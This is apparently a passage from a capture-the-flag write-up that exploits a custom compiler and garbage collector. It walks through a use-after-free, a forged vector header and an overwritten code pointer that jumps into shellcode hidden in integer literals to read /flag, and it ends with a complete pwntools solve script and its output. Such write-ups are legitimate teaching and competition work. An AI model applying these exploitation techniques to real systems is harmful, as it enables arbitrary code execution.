+stage allocates a (which is let bound and rooted), then tail calls ret2. the first argument is make-vec 126 which is an inline argument, so it is not rooted, and it is exactly where the value ret2 returns. the second argument allocates c (rooted) , then make-vec 254 (dead, unrooted), then make-vec 318 (the value, unrooted)
+ 
+the sizing comes from the outer program, it first evaluates fill = make-vec 523639, which is (523639 plus 2) times 8 bytes, about 4.19 MB, against a 4 MB heap which consumes nearly the whole heap and leaves a few kilobytes free, hence the small allocations inside stage exhaust the remainder and force a gc_collect exactly at make-vec 318. at that collect the roots are fill, a, and c, make-vec 126 is unrooted and gets swept. ret2 returns the freed 126 pointer and it is bound to stale
+
+![uaf](mapleuaf.png)
+
+stale is rooted after it comes back, but its block is already free and ```mark_object``` skips it, the next allocation, ```r = make-vec 198```, forces a second collect that sweeps a, c and 318, coalesces the whole region behind fill into a single free block, then places r at the start of it. now, r physically overlaps the bytes stale points to!
+
+### forging a header and writing the code label
+
+stale still carries its old header claiming a vector length of 126 so it already passes ```vec-set!``` type and bounds checks, we can also write through r onto the exact words stale reads as its header
+
+```scheme
+(vec-set! r 103 unit)
+(vec-set! r 104 1000)
+```
+
+unit encodes as the value 2 which equals the vector tag, so r index 103 puts a valid vector tag at stale word 0. 1000 tags to 8000 so r index 104 puts an enormous length at a stale word 1, so now fake (bound to stale) is a vector of length 8000 and a single in bounds index reaches far outside r
+
+```scheme
+(vec-set! fake 97 525880)
+```
+
+### the shellcode and the tagged code pointer
+
+the value written is 525880, and integer tagging multiplies by eight, so the stored code label becomes 525880 times 8 = 0x4031c0 which is an address inside of ```.text``` and it is also where the shellcode lives
+
+the top level begin starts with eighteen integer literals, ```imperative_transform.rkt``` spillss each one into a temporary, and ```emit_instructions.rkt``` emits that as ```mov r11, imm64``` (the bytes ```49 bb``` followed by the 8 byte immediate) followed by a store. the immediate bytes sit in the ```.text``` which is executable for us. jump into an immediate and it runs as code. the tag scheme forces the low byte of every literal to 00 and each fragments ends in ```eb 0a```, a jmp of plus ```0x0a``` which steps over the store instruction and the next opcode and the next forced zero byte. the shellcode fragments decode to open, read, write, exit chain 
+
+```text
+xor eax, eax / push rax        
+push 0x67616c66                
+mov byte [rsp-1], 0x2f         
+lea rdi, [rsp-1]               
+xor esi, esi / mov al, 2       
+syscall / mov edi, eax        
+mov rsi, rsp / xor edx, edx    
+mov dl, 0x80 / xor eax, eax    
+syscall / mov edx, eax        
+mov edi, 1                     
+mov eax, 1                     
+syscall / xor edi, edi
+mov eax, 0x3c                 
+syscall
+```
+
+and the last statement calls target whose code label is now ```0x4031c0```
+
+```scheme
+(call target 0)
+```
+
+we can bp on the first shellcode instruction to confirm the dispatch reads the corrupted label and tail jumps (jmp rax with rax = 0x4031c0)
+
+### solve 
+
+```python
+from pwn import *
+ 
+PAYLOAD = b'(letrec ([ret2 (lambda (p q) p)] [stage (lambda () (let ([a (make-vec 100)]) (call ret2 (make-vec 126) (let ([c (make-vec 1)]) (begin (make-vec 254) (make-vec 318))))))]) (begin 1 1 1 1 98360188676343328 98354528504302848 98346916597242048 98375386509977856 98360112642442784 98360218322248160 98369208958658816 98360214380615232 98360215637893600 98340319988299744 98340319988299520 98360248202469856 98340319988782848 -1003719898129456672 (let ([fill (make-vec 523639)] [stale (call stage)] [r (make-vec 198)] [target (lambda (x) x)]) (let ([fake stale]) (begin (vec-set! r 103 unit) (vec-set! r 104 1000) (vec-set! fake 97 525880) (call target 0))))))'
+ 
+def main():
+    host = args.HOST or '127.0.0.1'
+    port = int(args.PORT or 1337)
+    io = remote(host, port)
+    io.recvuntil(b'>>> ')
+    io.sendline(PAYLOAD)
+    print(io.recvall(timeout=10).decode(errors='replace'), end='')
+ 
+if __name__ == '__main__':
+    main()
+```
+
+```bash
+racket main.rkt prog.src prog.asm
+nasm -f elf64 -o prog.o prog.asm
+ld -o prog prog.o gc.o
+strace -e openat,read,write ./prog
+```
+
+which outputs
+
+```text
+open('/flag', O_RDONLY)          = 3
+read(3, 'bbb{fake_flag}\n', 128)  = 15
+write(1, 'bbb{fake_flag}\n', 15)
+exit(0)
+```
